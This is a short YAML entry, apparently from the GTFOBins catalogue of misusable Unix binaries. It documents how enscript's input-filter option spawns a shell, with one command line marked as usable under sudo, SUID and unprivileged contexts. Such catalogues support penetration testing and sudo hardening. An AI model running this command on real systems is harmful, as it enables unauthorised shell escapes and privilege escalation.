<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/enscript -->
---
functions:
  shell:
  - code: |-
      enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
